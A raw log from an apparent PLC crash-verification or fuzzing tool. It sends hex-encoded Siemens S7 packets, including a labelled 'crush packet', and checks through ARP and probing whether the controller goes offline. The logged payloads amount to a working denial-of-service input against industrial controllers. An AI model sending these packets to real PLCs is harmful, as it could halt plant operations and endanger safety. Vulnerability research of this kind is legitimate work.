[2021-12-19 20:06:16,919] [INFO] [verifyClient.connect] -> Start connect PLC
[2021-12-19 20:06:26,087] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002c00000800080001120411440100ff090004001c0000
[2021-12-19 20:06:26,290] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002d00000800080001120411440100ff090004001c0000
[2021-12-19 20:06:26,508] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002e00000800080001120411440100ff090004001c0000
[2021-12-19 20:06:26,711] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002f00000800080001120411440100ff090004001c0000
[2021-12-19 20:06:26,914] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003000000800080001120411440100ff090004001c0000
[2021-12-19 20:06:27,119] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003100000800080001120411440100ff090004001c0000
[2021-12-19 20:06:27,325] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003200000800080001120411440100ff090004001c0000
[2021-12-19 20:06:27,532] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003300000800080001120411440100ff090004001c0000
[2021-12-19 20:06:27,737] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003400000800080001120411440100ff090004001c0000
[2021-12-19 20:06:27,943] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003500000800080001120411440100ff090004001c0000
[2021-12-19 20:06:28,148] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003600000800080001120411440100ff090004001c0000
[2021-12-19 20:06:28,226] [INFO] [vertifyPassiveARP.passiveCallback] -> passiveDetect find a Crush
[2021-12-19 20:06:28,351] [INFO] [verifyClient.activeDetect] -> checking whether the PLC is online
[2021-12-19 20:06:40,386] [INFO] [verifyClient.activeDetect] -> the PLC is offline
[2021-12-19 20:06:40,387] [INFO] [vertifyPassiveARP.<module>] -> No: 1, sended packets 53 ,passiveDetected find a Crush, The activeDetect ans is Crush
[2021-12-19 20:06:45,798] [INFO] [verifyClient.connect] -> Start connect PLC
[2021-12-19 20:06:47,840] [INFO] [verifyClient.send_receive_s7_packet] -> [Connect request]0300001902f08032010000370000080000f000000a000a00f0
[2021-12-19 20:06:47,842] [INFO] [verifyClient.send_receive_s7_packet] -> [Connect responde]0300001b02f080320300003700000800000000f0000003000300f0
[2021-12-19 20:06:49,848] [INFO] [verifyClient.passiveDetect] -> start listen arp
[2021-12-19 20:06:49,848] [INFO] [vertifyPassiveARP.<module>] -> The Crush Packet is 46
[2021-12-19 20:06:49,855] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003800000800080001120411440100ff090004001c0000
[2021-12-19 20:06:50,067] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003900000800080001120411440100ff090004001c0000
[2021-12-19 20:06:50,273] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003a00000800080001120411440100ff090004001c0000
[2021-12-19 20:06:50,478] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003b00000800080001120411440100ff090004001c0000
[2021-12-19 20:06:50,683] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003c00000800080001120411440100ff090004001c0000
[2021-12-19 20:06:50,886] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003d00000800080001120411440100ff090004001c0000
[2021-12-19 20:06:51,091] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003e00000800080001120411440100ff090004001c0000
[2021-12-19 20:06:51,294] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003f00000800080001120411440100ff090004001c0000
[2021-12-19 20:06:51,500] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004000000800080001120411440100ff090004001c0000
[2021-12-19 20:06:51,707] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004100000800080001120411440100ff090004001c0000
[2021-12-19 20:06:51,915] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004200000800080001120411440100ff090004001c0000
[2021-12-19 20:06:52,120] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004300000800080001120411440100ff090004001c0000
[2021-12-19 20:06:52,324] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004400000800080001120411440100ff090004001c0000
[2021-12-19 20:06:52,529] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004500000800080001120411440100ff090004001c0000
[2021-12-19 20:06:52,747] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004600000800080001120411440100ff090004001c0000
[2021-12-19 20:06:52,951] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004700000800080001120411440100ff090004001c0000
[2021-12-19 20:06:53,155] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004800000800080001120411440100ff090004001c0000
[2021-12-19 20:06:53,358] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004900000800080001120411440100ff090004001c0000
[2021-12-19 20:06:53,565] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004a00000800080001120411440100ff090004001c0000
[2021-12-19 20:06:53,769] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004b00000800080001120411440100ff090004001c0000
[2021-12-19 20:06:53,972] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004c00000800080001120411440100ff090004001c0000
[2021-12-19 20:06:54,178] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004d00000800080001120411440100ff090004001c0000
[2021-12-19 20:06:54,383] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004e00000800080001120411440100ff090004001c0000
[2021-12-19 20:06:54,587] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004f00000800080001120411440100ff090004001c0000
[2021-12-19 20:06:54,791] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005000000800080001120411440100ff090004001c0000
[2021-12-19 20:06:54,994] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005100000800080001120411440100ff090004001c0000
[2021-12-19 20:06:55,199] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005200000800080001120411440100ff090004001c0000
[2021-12-19 20:06:55,404] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005300000800080001120411440100ff090004001c0000
[2021-12-19 20:06:55,612] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005400000800080001120411440100ff090004001c0000
[2021-12-19 20:06:55,818] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005500000800080001120411440100ff090004001c0000
[2021-12-19 20:06:56,023] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005600000800080001120411440100ff090004001c0000
[2021-12-19 20:06:56,227] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005700000800080001120411440100ff090004001c0000
[2021-12-19 20:06:56,433] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005800000800080001120411440100ff090004001c0000
[2021-12-19 20:06:56,639] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005900000800080001120411440100ff090004001c0000
[2021-12-19 20:06:56,846] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005a00000800080001120411440100ff090004001c0000
[2021-12-19 20:06:57,053] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005b00000800080001120411440100ff090004001c0000
[2021-12-19 20:06:57,255] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005c00000800080001120411440100ff090004001c0000
[2021-12-19 20:06:57,461] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005d00000800080001120411440100ff090004001c0000
[2021-12-19 20:06:57,664] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005e00000800080001120411440100ff090004001c0000
[2021-12-19 20:06:57,872] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700005f00000800080001120411440100ff090004001c0000
[2021-12-19 20:06:58,076] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006000000800080001120411440100ff090004001c0000
[2021-12-19 20:06:58,282] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006100000800080001120411440100ff090004001c0000
[2021-12-19 20:06:58,499] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006200000800080001120411440100ff090004001c0000
[2021-12-19 20:06:58,706] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006300000800080001120411440100ff090004001c0000
[2021-12-19 20:06:58,910] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006400000800080001120411440100ff090004001c0000
[2021-12-19 20:06:59,115] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006500000800080001120411440100ff090004001c0000
[2021-12-19 20:06:59,623] [INFO] [verifyClient.send_s7_packet] -> Send the crush packet
[2021-12-19 20:06:59,624] [INFO] [verifyClient.send_s7_packet] -> [request]0300001f02f080320100006600000e00000401120a10010003000083000001
[2021-12-19 20:06:59,840] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006700000800080001120411440100ff090004001c0000
[2021-12-19 20:07:00,044] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006800000800080001120411440100ff090004001c0000
[2021-12-19 20:07:00,248] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006900000800080001120411440100ff090004001c0000
[2021-12-19 20:07:00,455] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006a00000800080001120411440100ff090004001c0000
[2021-12-19 20:07:00,672] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006b00000800080001120411440100ff090004001c0000
[2021-12-19 20:07:00,880] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006c00000800080001120411440100ff090004001c0000
[2021-12-19 20:07:01,087] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006d00000800080001120411440100ff090004001c0000
[2021-12-19 20:07:01,292] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006e00000800080001120411440100ff090004001c0000
[2021-12-19 20:07:01,498] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700006f00000800080001120411440100ff090004001c0000
[2021-12-19 20:07:01,702] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007000000800080001120411440100ff090004001c0000
[2021-12-19 20:07:01,908] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007100000800080001120411440100ff090004001c0000
[2021-12-19 20:07:02,111] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007200000800080001120411440100ff090004001c0000
[2021-12-19 20:07:02,319] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007300000800080001120411440100ff090004001c0000
[2021-12-19 20:07:02,526] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007400000800080001120411440100ff090004001c0000
[2021-12-19 20:07:02,732] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007500000800080001120411440100ff090004001c0000
[2021-12-19 20:07:02,938] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007600000800080001120411440100ff090004001c0000
[2021-12-19 20:07:03,144] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007700000800080001120411440100ff090004001c0000
[2021-12-19 20:07:03,347] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007800000800080001120411440100ff090004001c0000
[2021-12-19 20:07:03,554] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007900000800080001120411440100ff090004001c0000
[2021-12-19 20:07:03,759] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007a00000800080001120411440100ff090004001c0000
[2021-12-19 20:07:03,965] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007b00000800080001120411440100ff090004001c0000
[2021-12-19 20:07:04,173] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007c00000800080001120411440100ff090004001c0000
[2021-12-19 20:07:04,376] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007d00000800080001120411440100ff090004001c0000
[2021-12-19 20:07:04,584] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007e00000800080001120411440100ff090004001c0000
[2021-12-19 20:07:04,789] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700007f00000800080001120411440100ff090004001c0000
[2021-12-19 20:07:04,995] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008000000800080001120411440100ff090004001c0000
[2021-12-19 20:07:05,201] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008100000800080001120411440100ff090004001c0000
[2021-12-19 20:07:05,406] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008200000800080001120411440100ff090004001c0000
[2021-12-19 20:07:05,612] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008300000800080001120411440100ff090004001c0000
[2021-12-19 20:07:05,815] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008400000800080001120411440100ff090004001c0000
[2021-12-19 20:07:06,022] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008500000800080001120411440100ff090004001c0000
[2021-12-19 20:07:06,229] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008600000800080001120411440100ff090004001c0000
[2021-12-19 20:07:06,434] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008700000800080001120411440100ff090004001c0000
[2021-12-19 20:07:06,640] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008800000800080001120411440100ff090004001c0000
[2021-12-19 20:07:06,845] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008900000800080001120411440100ff090004001c0000
[2021-12-19 20:07:07,053] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008a00000800080001120411440100ff090004001c0000
[2021-12-19 20:07:07,259] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008b00000800080001120411440100ff090004001c0000
[2021-12-19 20:07:07,475] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008c00000800080001120411440100ff090004001c0000
[2021-12-19 20:07:07,683] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008d00000800080001120411440100ff090004001c0000
[2021-12-19 20:07:07,890] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008e00000800080001120411440100ff090004001c0000
[2021-12-19 20:07:08,096] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700008f00000800080001120411440100ff090004001c0000
[2021-12-19 20:07:08,223] [INFO] [vertifyPassiveARP.passiveCallback] -> passiveDetect find a Crush
[2021-12-19 20:07:08,302] [INFO] [verifyClient.activeDetect] -> checking whether the PLC is online
[2021-12-19 20:07:12,225] [INFO] [verifyClient.activeDetect] -> the PLC is online
[2021-12-19 20:07:12,225] [INFO] [vertifyPassiveARP.<module>] -> No: 2, sended packets 88 ,passiveDetected find a Crush, The activeDetect ans is Online
[2021-12-19 20:07:12,228] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700009000000800080001120411440100ff090004001c0000
[2021-12-19 20:07:12,433] [INFO] [verifyClient.activeDetect] -> checking whether the PLC is online
[2021-12-19 20:07:12,464] [INFO] [verifyClient.activeDetect] -> the PLC is online
[2021-12-19 20:07:12,464] [INFO] [vertifyPassiveARP.<module>] -> No: 2, sended packets 89 ,passiveDetected find a Crush, The activeDetect ans is Online
[2021-12-19 20:07:12,466] [ERROR] [verifyClient.send_s7_packet] -> [WinError 10054] 远程主机强迫关闭了一个现有的连接。
[2021-12-19 20:07:12,668] [INFO] [verifyClient.activeDetect] -> checking whether the PLC is online
[2021-12-19 20:07:12,688] [INFO] [verifyClient.activeDetect] -> the PLC is online
[2021-12-19 20:07:12,690] [INFO] [vertifyPassiveARP.<module>] -> No: 2, sended packets 90 ,passiveDetected find a Crush, The activeDetect ans is Online
[2021-12-19 20:07:12,691] [ERROR] [verifyClient.send_s7_packet] -> [WinError 10054] 远程主机强迫关闭了一个现有的连接。
[2021-12-19 20:07:12,903] [INFO] [verifyClient.activeDetect] -> checking whether the PLC is online
[2021-12-19 20:07:12,913] [INFO] [verifyClient.activeDetect] -> the PLC is online
[2021-12-19 20:07:12,913] [INFO] [vertifyPassiveARP.<module>] -> No: 2, sended packets 91 ,passiveDetected find a Crush, The activeDetect ans is Online
[2021-12-19 20:07:12,915] [ERROR] [verifyClient.send_s7_packet] -> [WinError 10054] 远程主机强迫关闭了一个现有的连接。
[2021-12-19 20:07:13,122] [INFO] [verifyClient.activeDetect] -> checking whether the PLC is online
[2021-12-19 20:07:13,132] [INFO] [verifyClient.activeDetect] -> the PLC is online
[2021-12-19 20:07:13,133] [INFO] [vertifyPassiveARP.<module>] -> No: 2, sended packets 92 ,passiveDetected find a Crush, The activeDetect ans is Online
[2021-12-19 20:07:13,135] [ERROR] [verifyClient.send_s7_packet] -> [WinError 10054] 远程主机强迫关闭了一个现有的连接。
[2021-12-19 20:07:13,339] [INFO] [verifyClient.activeDetect] -> checking whether the PLC is online
[2021-12-19 20:07:13,361] [INFO] [verifyClient.activeDetect] -> the PLC is online
[2021-12-19 20:07:13,362] [INFO] [vertifyPassiveARP.<module>] -> No: 2, sended packets 93 ,passiveDetected find a Crush, The activeDetect ans is Online
[2021-12-19 20:07:13,363] [ERROR] [verifyClient.send_s7_packet] -> [WinError 10054] 远程主机强迫关闭了一个现有的连接。
[2021-12-19 20:07:13,573] [INFO] [verifyClient.activeDetect] -> checking whether the PLC is online
[2021-12-19 20:07:13,586] [INFO] [verifyClient.activeDetect] -> the PLC is online
[2021-12-19 20:07:13,586] [INFO] [vertifyPassiveARP.<module>] -> No: 2, sended packets 94 ,passiveDetected find a Crush, The activeDetect ans is Online
[2021-12-19 20:07:13,587] [ERROR] [verifyClient.send_s7_packet] -> [WinError 10054] 远程主机强迫关闭了一个现有的连接。
[2021-12-19 20:07:13,792] [INFO] [verifyClient.activeDetect] -> checking whether the PLC is online
[2021-12-19 20:07:13,808] [INFO] [verifyClient.activeDetect] -> the PLC is online
[2021-12-19 20:07:13,809] [INFO] [vertifyPassiveARP.<module>] -> No: 2, sended packets 95 ,passiveDetected find a Crush, The activeDetect ans is Online
[2021-12-19 20:07:13,813] [ERROR] [verifyClient.send_s7_packet] -> [WinError 10054] 远程主机强迫关闭了一个现有的连接。
[2021-12-19 20:07:14,026] [INFO] [verifyClient.activeDetect] -> checking whether the PLC is online
[2021-12-19 20:07:14,035] [INFO] [verifyClient.activeDetect] -> the PLC is online
[2021-12-19 20:07:14,036] [INFO] [vertifyPassiveARP.<module>] -> No: 2, sended packets 96 ,passiveDetected find a Crush, The activeDetect ans is Online
[2021-12-19 20:07:14,036] [ERROR] [verifyClient.send_s7_packet] -> [WinError 10054] 远程主机强迫关闭了一个现有的连接。
[2021-12-19 20:07:14,243] [INFO] [verifyClient.activeDetect] -> checking whether the PLC is online
[2021-12-19 20:07:14,256] [INFO] [verifyClient.activeDetect] -> the PLC is online
[2021-12-19 20:07:14,257] [INFO] [vertifyPassiveARP.<module>] -> No: 2, sended packets 97 ,passiveDetected find a Crush, The activeDetect ans is Online
[2021-12-19 20:07:14,258] [ERROR] [verifyClient.send_s7_packet] -> [WinError 10054] 远程主机强迫关闭了一个现有的连接。
[2021-12-19 20:07:14,461] [INFO] [verifyClient.activeDetect] -> checking whether the PLC is online
[2021-12-19 20:07:14,477] [INFO] [verifyClient.activeDetect] -> the PLC is online
[2021-12-19 20:07:14,479] [INFO] [vertifyPassiveARP.<module>] -> No: 2, sended packets 98 ,passiveDetected find a Crush, The activeDetect ans is Online
[2021-12-19 20:07:14,482] [ERROR] [verifyClient.send_s7_packet] -> [WinError 10054] 远程主机强迫关闭了一个现有的连接。
[2021-12-19 20:07:14,695] [INFO] [verifyClient.activeDetect] -> checking whether the PLC is online
[2021-12-19 20:07:14,702] [INFO] [verifyClient.activeDetect] -> the PLC is online
[2021-12-19 20:07:14,702] [INFO] [vertifyPassiveARP.<module>] -> No: 2, sended packets 99 ,passiveDetected find a Crush, The activeDetect ans is Online
[2021-12-19 20:07:14,703] [ERROR] [verifyClient.send_s7_packet] -> [WinError 10054] 远程主机强迫关闭了一个现有的连接。
[2021-12-19 20:07:14,914] [INFO] [verifyClient.activeDetect] -> checking whether the PLC is online
[2021-12-19 20:07:14,928] [INFO] [verifyClient.activeDetect] -> the PLC is online
[2021-12-19 20:07:14,928] [INFO] [vertifyPassiveARP.<module>] -> No: 2, sended packets 100 ,passiveDetected find a Crush, The activeDetect ans is Online
[2021-12-19 20:07:14,929] [ERROR] [verifyClient.send_s7_packet] -> [WinError 10054] 远程主机强迫关闭了一个现有的连接。
[2021-12-19 20:07:15,134] [INFO] [verifyClient.activeDetect] -> checking whether the PLC is online
[2021-12-19 20:07:15,143] [INFO] [verifyClient.activeDetect] -> the PLC is online
[2021-12-19 20:07:15,143] [INFO] [vertifyPassiveARP.<module>] -> No: 2, sended packets 101 ,passiveDetected find a Crush, The activeDetect ans is Online
[2021-12-19 20:07:15,144] [ERROR] [verifyClient.send_s7_packet] -> [WinError 10054] 远程主机强迫关闭了一个现有的连接。
[2021-12-19 20:07:15,352] [INFO] [verifyClient.activeDetect] -> checking whether the PLC is online
[2021-12-19 20:07:15,360] [INFO] [verifyClient.activeDetect] -> the PLC is online
